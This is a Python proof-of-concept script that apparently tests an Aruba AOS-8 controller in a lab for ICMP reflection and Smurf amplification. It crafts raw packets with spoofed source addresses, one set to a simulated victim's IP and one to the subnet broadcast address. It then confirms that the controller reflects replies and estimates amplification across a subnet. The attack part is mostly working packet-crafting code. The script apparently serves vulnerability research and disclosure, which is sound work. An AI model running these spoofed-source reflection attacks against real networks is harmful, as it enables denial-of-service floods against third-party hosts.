#!/usr/bin/env python3
"""
AOS-8 Chain 1 Verification — Smurf + Reflection Combined PoC

Proven individually:
  C6.3:  src=broadcast → reply to broadcast (Smurf)
  C6.11: src=10.0.0.1 → reply routed cross-subnet (no uRPF)

This test combines both: single packet proving the controller
can be used as a reflection amplifier against arbitrary targets.

Tests:
  1. src=your_other_interface (192.168.1.37) → reflection to your own host
  2. src=external_subnet_broadcast → Smurf reflection to external subnet
  3. Amplification factor measurement (reply size vs request size)

Usage: sudo python3 test_chain1.py
Capture on BOTH interfaces:
  Terminal 1: sudo tcpdump -i enp0s8 -w chain1_send.pcap icmp
  Terminal 2: sudo tcpdump -i enp0s3 -w chain1_reflect.pcap icmp
"""
import socket, struct, binascii, time

# ========================= CONFIGURATION =========================
SEND_INTERFACE = "enp0s8"           # Interface to controller
RECV_INTERFACE = "enp0s8"           # Interface to receive reflected reply
CONTROLLER_IP  = "192.168.56.50"
ATTACKER_IP    = "192.168.56.103"   # Our IP on send interface
VICTIM_IP      = "192.168.56.1"     # Our IP on recv interface (simulated victim)
CONTROLLER_MAC = "08:00:27:6d:6c:95"
ATTACKER_MAC   = "08:00:27:cc:05:43"
# =================================================================

def cksum(data):
    if len(data) % 2: data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += data[i] | (data[i+1] << 8)
    while s >> 16: s = (s >> 16) + (s & 0xFFFF)
    return (~s) & 0xFFFF

def build_eth():
    d = binascii.unhexlify(CONTROLLER_MAC.replace(":",""))
    s = binascii.unhexlify(ATTACKER_MAC.replace(":",""))
    return struct.pack("!6s6sH", d, s, 0x0800)

def make_ip(total_len, ip_id, src_ip):
    h = bytearray(struct.pack('!BBHHHBBH4s4s',
        0x45, 0, total_len, ip_id, 0x4000, 64, 1, 0,
        socket.inet_aton(src_ip),
        socket.inet_aton(CONTROLLER_IP)))
    c = cksum(bytes(h)); h[10]=c&0xFF; h[11]=(c>>8)&0xFF
    return bytes(h)

def make_echo(eid, seq, payload):
    ic = bytearray(struct.pack('!BBHHH', 8, 0, 0, eid, seq) + payload)
    c = cksum(bytes(ic)); ic[2]=c&0xFF; ic[3]=(c>>8)&0xFF
    return bytes(ic)

ETH = build_eth()

print("="*60)
print(" CHAIN 1 — Smurf + Reflection Combined PoC")
print(f" Controller: {CONTROLLER_IP}")
print(f" Send via:   {SEND_INTERFACE} ({ATTACKER_IP})")
print(f" Victim:     {VICTIM_IP} (our other interface)")
print(f"")
print(f" Capture on BOTH interfaces:")
print(f"   sudo tcpdump -i {SEND_INTERFACE} -w chain1_send.pcap icmp")
print(f"   sudo tcpdump -i {RECV_INTERFACE} -w chain1_recv.pcap icmp")
print("="*60)

# Open send socket
send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
send_sock.bind((SEND_INTERFACE, 0))

# Open receive socket on victim interface
recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
recv_sock.bind((RECV_INTERFACE, 0))
recv_sock.settimeout(5)

# ─── TEST 1: Reflection to own host ───
print(f"\n{'─'*55}")
print(f" Test 1: Reflection — src={VICTIM_IP}")
print(f" Expected: Controller replies to {VICTIM_IP}")
print(f"{'─'*55}")

payload1 = b'CHAIN1_REFLECT!!'
ic1 = make_echo(0xC101, 1, payload1)
ip1 = make_ip(20+len(ic1), 0xCC01, src_ip=VICTIM_IP)
pkt1 = ETH + ip1 + ic1

print(f" Sending {len(pkt1)}B via {SEND_INTERFACE}...")
send_sock.send(pkt1)
print(f" [SENT] {time.strftime('%H:%M:%S')} — src={VICTIM_IP} → dst={CONTROLLER_IP}")
print(f" Listening on {RECV_INTERFACE} for reflected reply (5s)...")

reflected1 = False
try:
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            resp = recv_sock.recv(65535)
        except socket.timeout:
            break
        if len(resp) < 34: continue
        if struct.unpack("!H", resp[12:14])[0] != 0x0800: continue
        if resp[23] != 1: continue
        resp_src = socket.inet_ntoa(resp[26:30])
        resp_dst = socket.inet_ntoa(resp[30:34])
        rt = resp[34]
        if rt == 0 and resp_src == CONTROLLER_IP and resp_dst == VICTIM_IP:
            rid = struct.unpack("!H", resp[38:40])[0]
            reflected1 = True
            print(f"\n [!] REFLECTION CONFIRMED!")
            print(f"     Reply: {resp_src} → {resp_dst}")
            print(f"     ICMP Echo Reply id=0x{rid:04x}")
            print(f"     Frame size: {len(resp)}B")
            break
except Exception as e:
    print(f" ERR: {e}")

if not reflected1:
    print(f" [-] No reflected reply on {RECV_INTERFACE}")
    print(f"     (May need routing — check controller's default gateway)")

time.sleep(2)

# ─── TEST 2: Amplification factor ───
print(f"\n{'─'*55}")
print(f" Test 2: Amplification Factor Measurement")
print(f"{'─'*55}")

# Send small request, controller echoes payload → 1:1 for Echo
# But with Smurf (broadcast), 1 packet → N hosts receive
# Measure: request size vs reply size
payload2 = b'AMP'  # Minimal 3-byte payload
ic2 = make_echo(0xC102, 2, payload2)
ip2 = make_ip(20+len(ic2), 0xCC02, src_ip=ATTACKER_IP)  # Normal src for this test
pkt2 = ETH + ip2 + ic2

print(f" Request size: {len(pkt2) - 14}B (IP+ICMP)")
send_sock.send(pkt2)

# Listen on send interface for reply
send_sock.settimeout(3)
try:
    deadline = time.time() + 3
    while time.time() < deadline:
        try:
            resp = send_sock.recv(65535)
        except socket.timeout:
            break
        if len(resp) < 34: continue
        if resp[6:12] != binascii.unhexlify(CONTROLLER_MAC.replace(":","")):
            continue
        if struct.unpack("!H", resp[12:14])[0] != 0x0800: continue
        if resp[23] == 1 and resp[34] == 0:
            rid = struct.unpack("!H", resp[38:40])[0]
            if rid == 0xC102:
                reply_ip_len = struct.unpack("!H", resp[16:18])[0]
                req_ip_len = len(pkt2) - 14
                print(f" Reply size: {reply_ip_len}B (IP+ICMP)")
                ratio = reply_ip_len / req_ip_len
                print(f" Ratio: {ratio:.2f}x (1:1 for Echo)")
                print(f"\n Smurf amplification: 1 packet → N hosts")
                print(f" If subnet has 254 hosts: 1:{ratio*254:.0f} effective amplification")
                break
except:
    pass

time.sleep(2)

# ─── TEST 3: Subnet broadcast reflection ───
print(f"\n{'─'*55}")
print(f" Test 3: Broadcast Reflection — src=192.168.56.255")
print(f" Expected: Reply to ff:ff:ff:ff:ff:ff + 192.168.56.255")
print(f"{'─'*55}")

payload3 = b'SMURF_CHAIN1'
ic3 = make_echo(0xC103, 3, payload3)
ip3 = make_ip(20+len(ic3), 0xCC03, src_ip="192.168.56.255")
pkt3 = ETH + ip3 + ic3

send_sock.send(pkt3)
print(f" [SENT] src=192.168.56.255 → dst={CONTROLLER_IP}")

send_sock.settimeout(3)
smurf_confirmed = False
try:
    deadline = time.time() + 3
    while time.time() < deadline:
        try:
            resp = send_sock.recv(65535)
        except socket.timeout:
            break
        if len(resp) < 34: continue
        if resp[6:12] != binascii.unhexlify(CONTROLLER_MAC.replace(":","")):
            continue
        if struct.unpack("!H", resp[12:14])[0] != 0x0800: continue
        if resp[23] == 1 and resp[34] == 0:
            resp_dst_mac = resp[0:6].hex()
            resp_dst_ip = socket.inet_ntoa(resp[30:34])
            rid = struct.unpack("!H", resp[38:40])[0]
            if rid == 0xC103:
                smurf_confirmed = True
                is_broadcast_mac = resp_dst_mac == "ffffffffffff"
                print(f"\n [!] SMURF REPLY CAPTURED!")
                print(f"     Dst MAC: {resp_dst_mac} {'(BROADCAST!)' if is_broadcast_mac else ''}")
                print(f"     Dst IP:  {resp_dst_ip}")
                print(f"     → Controller replied to broadcast address")
                break
except:
    pass

if not smurf_confirmed:
    print(f" [-] No Smurf reply captured (may have been received before listener ready)")
    print(f"     Check pcap for definitive evidence")

# ─── Summary ───
print(f"\n\n{'='*60}")
print(f" CHAIN 1 RESULTS")
print(f"{'='*60}")
print(f" Reflection (Test 1):  {'CONFIRMED' if reflected1 else 'CHECK PCAP'}")
print(f" Smurf (Test 3):       {'CONFIRMED' if smurf_confirmed else 'CHECK PCAP (C6.3 already proven)'}")
print(f"")
print(f" Combined attack vector:")
print(f"   Attacker → src=victim_IP, dst=controller → Controller → reply=victim_IP")
print(f"   No authentication, no rate limiting, no source validation.")
print(f"   Controller = unwilling ICMP reflection/amplification proxy.")
print(f"{'='*60}")

send_sock.close()
recv_sock.close()
